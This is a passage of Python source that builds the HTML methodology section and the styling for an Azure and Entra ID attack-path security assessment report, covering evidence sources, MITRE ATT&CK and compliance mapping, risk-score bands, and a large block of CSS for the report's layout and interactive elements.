    return """
<section class="section" id="methodology">
  <h2>Methodology</h2>
  <div class="how-to-read">
    <h4>Assessment Approach</h4>
    <p>This report is generated by analyzing your Azure and Entra ID environment through multiple evidence sources:</p>
    <p><strong>1. Azure Resource Graph</strong> — queries infrastructure configuration (storage accounts, VMs, NSGs, Key Vaults, SQL, AKS, etc.)</p>
    <p><strong>2. Microsoft Graph API</strong> — queries Entra ID configuration (role assignments, conditional access, OAuth grants, service principals, PIM assignments, risky users)</p>
    <p><strong>3. RBAC Analysis</strong> — maps principal-to-role-to-scope relationships for privilege escalation detection</p>
    <p><strong>4. Multi-Hop Chain Analysis</strong> — identifies paths where compromising one entity (identity, compute, network) enables access to higher-value targets</p>
    <p><strong>5. MITRE ATT&CK Mapping</strong> — every attack path is mapped to MITRE ATT&CK techniques and tactics for threat intelligence alignment</p>
    <p><strong>6. Compliance Mapping</strong> — attack paths are cross-referenced with NIST 800-53, CIS, HIPAA, PCI-DSS, ISO 27001, and SOC 2 controls</p>
  </div>
  <div class="how-to-read" style="margin-top:16px">
    <h4>Risk Scoring</h4>
    <p>Each attack path receives a <strong>risk score (0–100)</strong> based on exploitability, blast radius, and data sensitivity.</p>
    <p>The <strong>overall risk score</strong> is the maximum score across all detected paths.</p>
    <p><strong>Critical (≥80):</strong> Immediate action required — active exploitation likely.</p>
    <p><strong>High (60–79):</strong> Near-term remediation — significant exposure.</p>
    <p><strong>Medium (40–59):</strong> Scheduled remediation — moderate risk.</p>
    <p><strong>Low (&lt;40):</strong> Monitor — limited exploitability.</p>
  </div>
</section>"""


# ── Report-Specific CSS ─────────────────────────────────────────────────

def _report_css() -> str:
    """Attack-path-specific CSS additions."""
    return """
/* ── Override shared sidebar layout with top-nav ───────── */
.layout{display:block}
.sidebar{display:none!important}
.content{margin-left:0!important;max-width:none!important;padding:0!important}
.top-nav a{text-decoration:none;outline:none}
.top-nav a:hover{text-decoration:none}
.top-nav{position:sticky;top:0;z-index:500;display:flex;align-items:center;gap:4px;padding:8px 24px;
  background:var(--bg-elevated);border-bottom:1px solid var(--border);font-size:13px;flex-wrap:wrap}
.top-nav .brand{font-weight:700;color:var(--primary);font-size:14px;margin-right:12px;white-space:nowrap}
.top-nav a{color:var(--text-secondary);text-decoration:none;padding:6px 10px;border-radius:6px;transition:all .2s;min-height:36px;display:inline-flex;align-items:center}
.top-nav a:hover{color:var(--text);background:var(--bg-card)}
.nav-dropdown{position:relative}
.nav-dropdown>.nav-toggle{cursor:pointer;user-select:none;padding:6px 10px;border-radius:6px;color:var(--text-secondary);font-size:13px;display:inline-flex;align-items:center;gap:4px;transition:all .2s;min-height:36px;border:none;background:none;font-family:inherit}
.nav-dropdown>.nav-toggle:hover,.nav-dropdown:focus-within>.nav-toggle{color:var(--text);background:var(--bg-card)}
.nav-dropdown>.nav-toggle::after{content:'\\25BE';font-size:10px;margin-left:2px}
.nav-menu{display:none;position:absolute;top:100%;left:0;min-width:220px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;box-shadow:0 8px 24px rgba(0,0,0,.3);padding:6px 0;z-index:600;margin-top:4px}
.nav-dropdown:hover>.nav-menu,.nav-dropdown:focus-within>.nav-menu{display:block}
.nav-menu a{display:flex;padding:8px 16px;color:var(--text-secondary);font-size:12px;border-radius:0;min-height:auto;white-space:nowrap}
.nav-menu a:hover{color:var(--text);background:var(--bg-card)}
.nav-menu .nav-sep{height:1px;background:var(--border);margin:4px 12px}
.full-width-content{padding:32px 40px;max-width:1200px;margin:0 auto}
.top-nav .zoom-controls{position:static;background:none;border:none;box-shadow:none;padding:0;margin-left:auto}
.top-nav .theme-btn{margin:0;padding:6px 14px}

/* ── Exec Grid / Panels ────────────────────────────────── */
.exec-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin:24px 0}
.exec-panel{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:24px}
.exec-panel h3{font-size:14px;color:var(--text-secondary);margin-bottom:12px;border:none;padding:0}
.score-info{display:flex;flex-direction:column;gap:6px}
.level-badge{display:inline-block;padding:4px 12px;border-radius:6px;font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}

/* ── Category Grid / Cards ─────────────────────────────── */
.category-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin:16px 0}
.category-card{background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:24px;text-align:center;transition:all .3s;cursor:default;text-decoration:none;color:var(--text)}
.category-card:hover{transform:translateY(-2px);box-shadow:var(--shadow-md)}
.category-icon{font-size:32px;margin-bottom:8px}
.category-name{font-size:13px;color:var(--text-secondary);margin-bottom:4px}
.category-score{font-size:28px;font-weight:700;font-family:var(--font-mono)}
.category-level{font-size:11px;text-transform:uppercase;font-weight:600;letter-spacing:.5px;margin-top:2px}
.category-findings{font-size:11px;color:var(--text-muted);margin-top:4px}

/* ── Finding Title / Meta (data-security style) ────────── */
.finding-title{font-size:15px;font-weight:600;margin-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.finding-meta{display:flex;gap:20px;flex-wrap:wrap;font-size:12px;color:var(--text-muted);margin-bottom:10px;padding:6px 0}
.finding-meta span{display:inline-flex;align-items:center;gap:5px;white-space:nowrap}

/* ── Remediation Box (data-security style) ─────────────── */
.remediation-box{margin-top:10px;padding:14px;background:var(--remediation-bg);border-left:3px solid var(--remediation-border);border-radius:6px}
.remediation-box h4{font-size:12px;color:var(--remediation-border);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
.remediation-box .rem-desc{font-size:13px;color:#A5D6A7;margin-bottom:8px;line-height:1.5}
.remediation-box pre{font-family:var(--font-mono);font-size:12px;background:var(--code-bg);border:1px solid var(--code-border);border-radius:4px;padding:10px;overflow-x:auto;color:var(--text);margin:6px 0;white-space:pre-wrap;word-break:break-all}

/* ── Resource Table (data-security style) ──────────────── */
.resource-table{width:100%;border-collapse:separate;border-spacing:0;font-size:12px;margin:8px 0;border:1px solid var(--border);border-radius:8px;overflow:hidden}
.res-table-wrap{overflow-x:auto;margin:8px 0;-webkit-overflow-scrolling:touch}
.resource-table thead{background:var(--bg-elevated)}
.resource-table th{padding:8px 12px;text-align:left;font-weight:600;color:var(--text-secondary);text-transform:uppercase;font-size:11px;letter-spacing:.3px;border-bottom:2px solid var(--border);white-space:nowrap}
.resource-table td{padding:8px 12px;border-bottom:1px solid var(--border-light,var(--border));color:var(--text);vertical-align:top}
.resource-table tbody tr:last-child td{border-bottom:none}
.resource-table tbody tr:hover{background:var(--bg-card-hover,rgba(255,255,255,.03))}
.resource-table tbody tr.res-alt{background:rgba(255,255,255,.015)}
.resource-table .res-sev{white-space:nowrap;width:70px}
.res-name-primary{font-weight:600;font-size:12px}
.res-type-sub{font-size:10px;color:var(--text-muted)}
.res-id a{color:var(--primary);text-decoration:none;font-size:11px;word-break:break-all}
.res-id a:hover{text-decoration:underline}

/* ── Affected Details (data-security style) ────────────── */
.affected-details{margin-top:8px}
.affected-details summary{cursor:pointer;color:var(--primary);font-weight:500;font-size:12px;padding:6px 0}
.affected-details summary:hover{text-decoration:underline}

/* Posture banners */
.posture-banner{padding:16px 20px;border-radius:10px;margin-bottom:24px;font-size:15px;line-height:1.6;border-left:5px solid}
.posture-critical{background:rgba(209,52,56,0.08);border-color:#D13438;color:var(--text)}
.posture-high{background:rgba(255,140,0,0.08);border-color:#FF8C00;color:var(--text)}
.posture-medium{background:rgba(255,185,0,0.08);border-color:#FFB900;color:var(--text)}
.posture-low{background:rgba(16,124,16,0.08);border-color:#107C10;color:var(--text)}
.posture-banner strong{font-weight:700}

/* Executive narrative */
.exec-narrative{font-size:14px;line-height:1.8;color:var(--text-secondary);margin-bottom:20px;padding:14px 18px;background:linear-gradient(135deg,rgba(0,120,212,.06),rgba(107,63,160,.06));border:1px solid rgba(0,120,212,.15);border-radius:10px}

/* Score display */
.score-display{display:flex;align-items:center;gap:32px;flex-wrap:wrap;margin-bottom:24px}
.score-right{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.score-ring-wrap{cursor:help;display:inline-block}
.donut-legend{display:flex;flex-direction:column;gap:4px}
.legend-item{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text-secondary)}

/* Top findings table */
.top-findings-table{border:1px solid var(--border);border-radius:8px;overflow:hidden;margin:12px 0}
.top-finding-header{display:grid;grid-template-columns:40px 90px 1fr 180px 80px;gap:0;padding:10px 16px;background:var(--bg-elevated);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;color:var(--text-secondary);border-bottom:2px solid var(--border)}
.top-finding-row{display:grid;grid-template-columns:40px 90px 1fr 180px 80px;gap:0;padding:10px 16px;align-items:center;border-bottom:1px solid var(--border-light,var(--border));transition:background .15s}
.top-finding-row:last-child{border-bottom:none}
.top-finding-row:hover{background:var(--bg-card-hover,rgba(255,255,255,.03))}
.top-finding-row.tf-alt{background:rgba(255,255,255,.02)}
.tf-rank{font-size:16px;font-weight:700;font-family:var(--font-mono);color:var(--text-muted);text-align:center}
.tf-sev{display:flex;align-items:center}
.tf-title{font-size:13px;font-weight:600;padding-right:12px}
.tf-cat{font-size:12px;color:var(--text-muted)}
.tf-count{font-size:13px;font-family:var(--font-mono);text-align:right;font-weight:600}

/* Category cards */
.domain-card{text-decoration:none;color:var(--text)}
.cat-pill{display:inline-block;padding:1px 6px;border-radius:8px;color:#fff;font-size:10px;font-weight:600;margin:0 1px}

/* Finding cards */
.finding-header{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px}
.path-icon{font-size:16px}
.path-type-label{font-weight:600;font-size:14px}
.path-score-badge{font-size:12px;color:var(--text-secondary);margin-left:auto;cursor:help}
.mitre-badge{display:inline-block;padding:2px 8px;background:rgba(0,120,212,0.12);color:var(--primary);border-radius:4px;font-size:11px;font-weight:600;text-decoration:none;font-family:var(--font-mono)}
.mitre-badge:hover{background:rgba(0,120,212,0.2);text-decoration:none}
.tactic-label{font-size:11px;color:var(--text-muted);margin-left:4px}
.chain-text-description{font-size:13px;color:var(--text-secondary);line-height:1.6;margin:8px 0 12px;padding:8px 12px;background:var(--bg-subtle);border-radius:6px;border-left:3px solid var(--border)}
.chain-container{margin:8px 0}

/* ── Compliance Framework Popup ─────────────────────────── */
.compliance-fw-wrap{position:relative;margin:8px 0;display:flex;flex-wrap:wrap;gap:4px}
.fw-link{display:inline-flex;align-items:center;gap:4px;padding:4px 12px;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;color:var(--primary);background:color-mix(in srgb,var(--primary) 8%,transparent);border:1px solid color-mix(in srgb,var(--primary) 20%,transparent);text-decoration:none!important;transition:all .2s}
.fw-link:hover{background:color-mix(in srgb,var(--primary) 15%,transparent)}
.fw-link small{font-weight:400;color:var(--text-muted)}
/* Quadrant bubble chart — hover interaction */
.qd-bubble{transition:opacity .2s ease,transform .2s ease;cursor:default;transform-origin:center;transform-box:fill-box}
.qd-bubble:hover{opacity:1 !important;transform:scale(1.08)}
/* Size + severity legend shown below the SVG */
.qd-wrap{max-width:1240px;margin:0 auto}
.qd-size-legend{display:flex;flex-wrap:wrap;align-items:center;gap:14px;margin:10px 12px 4px;padding:10px 14px;border:1px solid var(--border);border-radius:8px;background:color-mix(in srgb,var(--bg-card) 70%,transparent);font-size:11px;color:var(--text-secondary)}
.qd-size-legend-h{font-weight:800;letter-spacing:.8px;text-transform:uppercase;color:var(--text-muted);font-size:10px;margin-right:6px}
.qd-size-item{display:inline-flex;align-items:center;gap:6px}
.qd-size-item svg{color:var(--text-muted)}
.qd-dot{display:inline-block;width:10px;height:10px;border-radius:50%}
/* Backdrop: dim the page behind the popup. NO backdrop-filter — it bleeds into the popup
   when an ancestor establishes a containing block (transform/filter ancestors). */
#fw-backdrop{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.65)}
#fw-backdrop.fw-show{display:block}
@keyframes fwPopIn{0%{opacity:0;transform:translate(-50%,-50%) scale(.88)}100%{opacity:1;transform:translate(-50%,-50%) scale(1)}}
/* Popup: solid opaque surface (NEVER use semi-transparent var here — Teams/iframe themes can
   make var(--bg-elevated) translucent which makes the popup look blurred). */
.fw-popup{display:none;flex-direction:column;position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:9999;min-width:520px;max-width:720px;width:88vw;max-height:78vh;background:#1f1f1f;color:#f3f3f3;border:1px solid color-mix(in srgb,#0078D4 50%,#3a3a3a);border-radius:12px;box-shadow:0 24px 64px rgba(0,0,0,.7);overflow:hidden;isolation:isolate}
@media (prefers-color-scheme: light){
  .fw-popup{background:#ffffff;color:#1f1f1f;border-color:#cfd6e4;box-shadow:0 24px 64px rgba(0,0,0,.25)}
}
.fw-popup.fw-open{display:flex;animation:fwPopIn .28s cubic-bezier(.34,1.56,.64,1) both}
.fw-popup-hdr{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,.08);font-weight:700;font-size:14px;color:inherit;background:linear-gradient(180deg,rgba(0,120,212,.10),transparent)}
.fw-popup-close{background:none;border:none;color:inherit;opacity:.7;font-size:18px;cursor:pointer;padding:4px 10px;border-radius:4px;line-height:1}
.fw-popup-close:hover{background:rgba(255,255,255,.1);opacity:1}
.fw-popup-body{overflow-y:auto;padding:14px 18px;display:flex;flex-direction:column;gap:14px;color:inherit}
@keyframes fwSlideIn{0%{opacity:0;transform:translateY(8px)}100%{opacity:1;transform:translateY(0)}}
.fw-open .fw-section-hdr,.fw-open .fw-ctrl{animation:fwSlideIn .3s ease both}
.fw-open .fw-section-hdr:nth-child(1){animation-delay:.05s}
.fw-open .fw-ctrl:nth-child(2){animation-delay:.08s}
.fw-open .fw-ctrl:nth-child(3){animation-delay:.11s}
.fw-open .fw-ctrl:nth-child(4){animation-delay:.14s}
.fw-open .fw-ctrl:nth-child(5){animation-delay:.17s}
.fw-section-hdr{display:flex;justify-content:space-between;align-items:center;font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;color:#4cb1ff;border-left:3px solid #0078D4;padding:4px 10px;background:rgba(0,120,212,.08);border-radius:0 6px 6px 0}
.fw-section-link{font-size:11px;font-weight:600;text-transform:none;letter-spacing:0;color:#4cb1ff;text-decoration:none;padding:2px 8px;border:1px solid rgba(76,177,255,.4);border-radius:10px}
.fw-section-link:hover{background:rgba(76,177,255,.15)}
.fw-section-issuer{font-size:11px;color:#9aa3b2;margin:2px 0 8px 13px;font-style:italic}
.fw-section{margin-bottom:6px}
.fw-finding-hdr{padding:10px 12px;background:linear-gradient(135deg,rgba(209,52,56,.10),rgba(231,72,86,.04));border-left:4px solid #D13438;border-radius:0 8px 8px 0}
.fw-finding-h{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:#ff8a8f;margin-bottom:4px}
.fw-finding-sum{font-size:13px;line-height:1.5;color:inherit;word-break:break-word}
.fw-finding-meta{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
.fw-finding-pill{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:10px;font-size:11px;color:inherit}
.fw-finding-pill code{font-family:var(--font-mono);font-size:10.5px;background:rgba(76,177,255,.15);padding:0 4px;border-radius:3px}
.fw-rel-intro{padding:10px 12px;background:rgba(0,120,212,.07);border-left:3px solid #0078D4;border-radius:0 6px 6px 0;font-size:12.5px;line-height:1.6;color:inherit}
.fw-ctrl{padding:10px 12px;border-radius:6px;font-size:12.5px;line-height:1.55;background:rgba(255,255,255,.04);margin-bottom:6px;color:inherit;word-break:break-word;border:1px solid rgba(255,255,255,.05)}
.fw-ctrl:hover{background:rgba(255,255,255,.07);border-color:rgba(76,177,255,.25)}
.fw-ctrl-row1{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;margin-bottom:4px}
.fw-ctrl-id{font-weight:700;font-family:var(--font-mono);font-size:11.5px;color:#4cb1ff;background:rgba(76,177,255,.12);padding:2px 8px;border-radius:4px;white-space:nowrap}
.fw-ctrl-title{font-weight:600;font-size:13px;color:inherit}
.fw-ctrl-desc{font-size:12px;line-height:1.55;color:inherit;opacity:.85;margin:4px 0}
.fw-ctrl-rel{font-size:11.5px;line-height:1.5;color:inherit;margin-top:6px;padding:6px 8px;background:rgba(0,120,212,.08);border-left:2px solid #0078D4;border-radius:0 4px 4px 0}
.fw-rel-h{font-weight:700;color:#4cb1ff}
.fw-table-wrap{margin-top:6px;border:1px solid rgba(255,255,255,.08);border-radius:6px;overflow:hidden}
.fw-table{width:100%;border-collapse:collapse;font-size:12px;line-height:1.5;table-layout:fixed}
.fw-table thead th{background:rgba(0,120,212,.14);color:#4cb1ff;font-weight:700;text-align:left;padding:8px 10px;font-size:11px;text-transform:uppercase;letter-spacing:.4px;border-bottom:1px solid rgba(76,177,255,.25);vertical-align:top}
.fw-table tbody td{padding:10px;vertical-align:top;border-bottom:1px solid rgba(255,255,255,.06);word-break:break-word;overflow-wrap:anywhere;color:inherit}
.fw-table tbody tr:last-child td{border-bottom:none}
.fw-table tbody tr:nth-child(even) td{background:rgba(255,255,255,.025)}
.fw-table tbody tr:hover td{background:rgba(76,177,255,.06)}
.fw-td-id .fw-ctrl-id{display:inline-block;margin:0}
.fw-td-title{font-weight:600;color:inherit}
.fw-td-desc{opacity:.88}
.fw-td-rel{background:rgba(0,120,212,.05);border-left:2px solid #0078D4}
@media (prefers-color-scheme: light){
  .fw-popup-hdr{border-bottom-color:#e2e7f0;background:linear-gradient(180deg,rgba(0,120,212,.06),transparent)}
  .fw-section-hdr{color:#0067be;border-left-color:#0078D4;background:rgba(0,120,212,.05)}
  .fw-section-link{color:#0067be;border-color:rgba(0,103,190,.4)}
  .fw-section-link:hover{background:rgba(0,103,190,.1)}
  .fw-section-issuer{color:#5a6573}
  .fw-finding-h{color:#a4262c}
  .fw-finding-pill{background:#f4f6fb;border-color:#e2e7f0}
  .fw-finding-pill code{background:rgba(0,103,190,.12);color:#0067be}
  .fw-rel-intro{background:#eef4fb}
  .fw-ctrl{background:#f4f6fb;border-color:#e7ecf3}
  .fw-ctrl:hover{background:#e8edf6;border-color:rgba(0,103,190,.3)}
  .fw-ctrl-id{color:#0067be;background:rgba(0,103,190,.10)}
  .fw-ctrl-rel{background:#eef4fb}
  .fw-rel-h{color:#0067be}
  .fw-table-wrap{border-color:#e2e7f0}
  .fw-table thead th{background:#eaf2fb;color:#0067be;border-bottom-color:#cfe0f4}
  .fw-table tbody td{border-bottom-color:#edf1f7}
  .fw-table tbody tr:nth-child(even) td{background:#fafcfe}
  .fw-table tbody tr:hover td{background:#eef5fd}
  .fw-td-rel{background:#eef4fb}
}

/* ── Tooltip Engine ─────────────────────────────────────── */
[data-tip]{cursor:help}
.stat-card[data-tip],.badge[data-tip],.category-card[data-tip]{border-bottom:none}
#ciq-tooltip{position:fixed;z-index:99999;pointer-events:none;opacity:0;transition:opacity .18s ease;max-width:360px;min-width:180px;padding:12px 16px;background:linear-gradient(145deg,var(--bg-elevated),color-mix(in srgb,var(--bg-elevated) 90%,#000));color:var(--text);border:1.5px solid color-mix(in srgb,var(--primary) 50%,var(--border));border-radius:10px;font-size:12px;line-height:1.6;white-space:normal;box-shadow:0 2px 6px rgba(0,0,0,.18),0 8px 24px rgba(0,0,0,.32),0 0 0 1px rgba(255,255,255,.06) inset}
#ciq-tooltip.visible{opacity:1}
#ciq-tooltip::before{content:'';position:absolute;width:10px;height:10px;background:linear-gradient(145deg,var(--bg-elevated),color-mix(in srgb,var(--bg-elevated) 90%,#000));border:1.5px solid color-mix(in srgb,var(--primary) 50%,var(--border));transform:rotate(45deg);z-index:-1}
#ciq-tooltip.arrow-bottom::before{bottom:-6px;left:var(--arrow-x,24px);border-top:none;border-left:none}
#ciq-tooltip.arrow-top::before{top:-6px;left:var(--arrow-x,24px);border-bottom:none;border-right:none}
#ciq-tooltip .t-sep{display:block;border-top:1px solid rgba(255,255,255,.15);margin:8px 0 4px;padding-top:6px;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--primary)}

/* ── Zoom Controls ──────────────────────────────────────── */
.zoom-controls{display:flex;align-items:center;gap:4px;position:fixed;bottom:70px;right:20px;z-index:100;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:4px;box-shadow:var(--shadow-md)}
.zoom-controls button{padding:4px 10px;border:1px solid var(--border);border-radius:4px;background:var(--bg-card);color:var(--text);cursor:pointer;font-size:14px;transition:all .2s}
.zoom-controls button:hover{border-color:var(--primary);color:var(--primary)}
#zoom-label{font-size:11px;font-family:var(--font-mono);width:36px;text-align:center;color:var(--text-muted)}

/* ── Animated Sequence Diagram ──────────────────────────── */
.seq-diagram{background:var(--bg-card);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:12px 0}
.seq-play-bar{display:flex;gap:6px;padding:8px 12px;background:var(--bg-elevated);border-bottom:1px solid var(--border);align-items:center;flex-wrap:wrap}
.seq-btn{padding:4px 12px;border:1px solid var(--border);border-radius:6px;background:var(--bg-card);color:var(--text-secondary);font-size:11px;cursor:pointer;transition:all .2s;font-family:var(--font-primary)}
.seq-btn:hover{color:var(--primary);border-color:var(--primary);background:rgba(0,120,212,.06)}
.seq-btn.active{color:var(--primary);border-color:var(--primary);font-weight:600}
.seq-step-indicator{margin-left:auto;font-size:11px;color:var(--text-muted);font-family:var(--font-mono)}
.seq-body{display:flex;min-height:200px}
.seq-main{flex:1;padding:16px;overflow-x:auto}
.seq-actors{display:flex;position:relative;padding-bottom:8px;border-bottom:1px solid var(--border-light,var(--border))}
.seq-actor{display:flex;flex-direction:column;align-items:center;min-width:130px;flex:1;position:relative}
.seq-actor-box{display:flex;flex-direction:column;align-items:center;gap:2px;padding:8px 12px;border:2px solid var(--border);border-radius:8px;background:var(--bg-elevated);min-width:110px;transition:all .3s}
.seq-actor-box.active{box-shadow:0 0 12px rgba(0,120,212,.3)}
.seq-actor-icon{font-size:18px}
.seq-actor-name{font-size:10px;font-weight:600;color:var(--text);text-align:center;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.seq-actor-tag{display:inline-block;padding:1px 6px;border-radius:3px;font-size:8px;font-weight:700;text-transform:uppercase;letter-spacing:.3px;color:#fff;margin-top:2px}
.seq-lifelines{position:relative;min-height:40px}
.seq-lifeline{position:absolute;top:0;bottom:0;width:2px;background:repeating-linear-gradient(to bottom,var(--border) 0 6px,transparent 6px 12px)}
.seq-messages{position:relative;padding:8px 0}
.seq-msg{display:flex;align-items:center;padding:14px 8px;opacity:0;transform:translateY(8px);transition:opacity .4s ease,transform .4s ease;cursor:pointer;border-radius:6px}
.seq-msg.visible{opacity:1;transform:translateY(0)}
.seq-msg.active{background:rgba(0,120,212,.06)}
.seq-msg:hover{background:rgba(0,120,212,.04)}
.seq-msg-num{width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:#fff;background:var(--primary);flex-shrink:0;margin-right:8px}
.seq-arrow-wrap{flex:1;position:relative;height:20px;margin:0 8px}
.seq-arrow-line{position:absolute;top:50%;left:0;right:0;height:2px;transform:translateY(-50%);background:transparent}
.seq-msg.visible .seq-arrow-line{background:currentColor}
.seq-arrow-line.animated{background:repeating-linear-gradient(90deg,currentColor 0 8px,transparent 8px 14px)!important;background-size:22px 2px;animation:seqDashFlow 1s linear infinite}
@keyframes seqDashFlow{to{background-position:22px 0}}
.seq-arrow-head{position:absolute;right:-2px;top:50%;transform:translateY(-50%);width:0;height:0;border-left:8px solid currentColor;border-top:5px solid transparent;border-bottom:5px solid transparent}
.seq-arrow-label{position:absolute;top:-14px;left:50%;transform:translateX(-50%);font-size:9px;font-weight:600;color:var(--text-secondary);white-space:nowrap;transition:color .3s;background:var(--bg-card);padding:0 4px;border-radius:2px;z-index:1}
.seq-msg.active .seq-arrow-label{color:var(--primary)}
.seq-mitre-tag{position:absolute;bottom:-14px;left:50%;transform:translateX(-50%);font-size:8px;font-family:var(--font-mono);color:var(--primary);background:rgba(0,120,212,.1);padding:0 4px;border-radius:2px}
.seq-explain-col{width:32%;min-width:200px;border-left:1px solid var(--border);padding:16px;background:var(--bg-subtle);overflow-y:auto;max-height:400px}
.seq-explain{display:none}
.seq-explain.active{display:block}
.seq-explain .seq-e-num{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:var(--primary);color:#fff;font-size:10px;font-weight:700;margin-right:6px}
.seq-explain .seq-e-title{font-size:14px;font-weight:700;color:var(--text);margin-bottom:6px}
.seq-explain .seq-e-desc{font-size:12px;color:var(--text-secondary);line-height:1.6;margin-bottom:8px}
.seq-explain .seq-e-flow{font-size:11px;color:var(--text-muted);margin-bottom:6px}
.seq-explain .seq-e-flow strong{color:var(--text)}
.seq-explain .seq-e-meta{font-size:10px;color:var(--text-muted);border-top:1px solid var(--border);padding-top:6px;margin-top:6px}
.seq-explain .seq-e-meta code{font-family:var(--font-mono);font-size:10px;color:var(--primary)}
/* Rich step fields (WHY/HOW/TOOLS/API/MITRE/DETECTION/PREREQ) */
.seq-rich{margin-top:8px;display:flex;flex-direction:column;gap:6px}
.seq-rich-row{display:flex;gap:6px;align-items:flex-start;font-size:11px;line-height:1.5}
.seq-rich-lbl{flex-shrink:0;display:inline-block;min-width:54px;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;text-align:center;color:#fff;font-family:var(--font-primary)}
.seq-rich-lbl.why{background:#0078D4}
.seq-rich-lbl.how{background:#8764B8}
.seq-rich-lbl.tools{background:#107C10}
.seq-rich-lbl.api{background:#5C2D91}
.seq-rich-lbl.perm{background:#FFB900;color:#1a1a1a}
.seq-rich-lbl.mitre{background:#D13438}
.seq-rich-lbl.detect{background:#00B7C3}
.seq-rich-lbl.prereq{background:#6B6B6B}
.seq-rich-val{flex:1;color:var(--text-secondary);word-break:break-word}
.seq-rich-val code{font-family:var(--font-mono);font-size:10px;background:var(--code-bg);padding:1px 5px;border-radius:3px;color:var(--primary)}
.seq-rich-val.api,.seq-rich-val.perm,.seq-rich-val.detect{font-family:var(--font-mono);font-size:10px;color:var(--text)}
.seq-explain-all{padding:12px;display:flex;flex-direction:column;gap:10px}
.seq-explain-all .seq-ea-card{padding:14px;border:1px solid var(--border);border-radius:8px;background:var(--bg-card)}
.seq-ea-card .seq-e-num{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:var(--primary);color:#fff;font-size:10px;font-weight:700;margin-right:6px;vertical-align:middle}
.seq-ea-card .seq-ea-title{font-size:13px;font-weight:700;color:var(--text);vertical-align:middle}
.seq-ea-card .seq-e-desc{font-size:12px;color:var(--text-secondary);line-height:1.6;margin:6px 0}
.seq-ea-card .seq-ea-flow{font-size:11px;color:var(--text-muted);margin:4px 0}
.seq-ea-card .seq-ea-flow strong{color:var(--text)}
.seq-ea-card .seq-ea-meta{font-size:10px;color:var(--text-muted);border-top:1px solid var(--border);padding-top:6px;margin-top:8px}
.seq-ea-card .seq-ea-meta code{font-family:var(--font-mono);font-size:10px;color:var(--primary)}
.seq-ea-card .seq-details-btn{display:inline-block;margin-top:8px;font-size:10px;color:var(--primary);cursor:pointer;text-decoration:underline;background:none;border:none;padding:0;font-family:var(--font-primary)}
.seq-details-btn{display:block;margin-top:8px;font-size:10px;color:var(--primary);cursor:pointer;text-decoration:underline;background:none;border:none;padding:0;font-family:var(--font-primary)}
.seq-modal-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.65)}
.seq-modal{display:none;position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:9999;min-width:600px;max-width:820px;width:90vw;max-height:82vh;background:#1f1f1f;color:#f3f3f3;border:1px solid #3a3a3a;border-radius:12px;box-shadow:0 24px 64px rgba(0,0,0,.7);overflow:hidden;isolation:isolate}
@media (prefers-color-scheme: light){.seq-modal{background:#ffffff;color:#1f1f1f;border-color:#cfd6e4;box-shadow:0 24px 64px rgba(0,0,0,.25)}}
.seq-modal.open{display:flex;flex-direction:column;animation:fwPopIn .28s cubic-bezier(.34,1.56,.64,1) both}
.seq-modal-hdr{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid var(--border);font-weight:700;font-size:14px}
.seq-modal-close{background:none;border:none;color:var(--text-secondary);font-size:18px;cursor:pointer;padding:4px 8px;border-radius:4px}
.seq-modal-close:hover{background:rgba(255,255,255,.1)}
.seq-modal-body{padding:18px;overflow-y:auto;font-size:13px;line-height:1.7;color:var(--text-secondary)}
.seq-modal-body code{font-family:var(--font-mono);font-size:11px;background:var(--code-bg);padding:2px 6px;border-radius:3px}
/* 3-tab modal */
.seq-mtab-bar{display:flex;gap:4px;border-bottom:2px solid var(--border);margin:4px 0 14px}
.seq-mtab-btn{flex:1;background:none;border:none;border-bottom:3px solid transparent;padding:9px 12px;font-size:12px;font-weight:600;color:var(--text-secondary);cursor:pointer;transition:all .2s;border-radius:6px 6px 0 0;font-family:var(--font-primary)}
.seq-mtab-btn:hover{background:rgba(0,120,212,.06);color:var(--text)}
.seq-mtab-btn.active{color:var(--primary);border-bottom-color:var(--primary);background:rgba(0,120,212,.05)}
.seq-mtab-content{min-height:200px}
.seq-mtab-pane{animation:fadeIn .2s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
.seq-mtab-section{margin-bottom:16px}
.seq-mtab-h{font-size:12px;font-weight:700;color:var(--text);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px;display:flex;align-items:center;gap:8px}
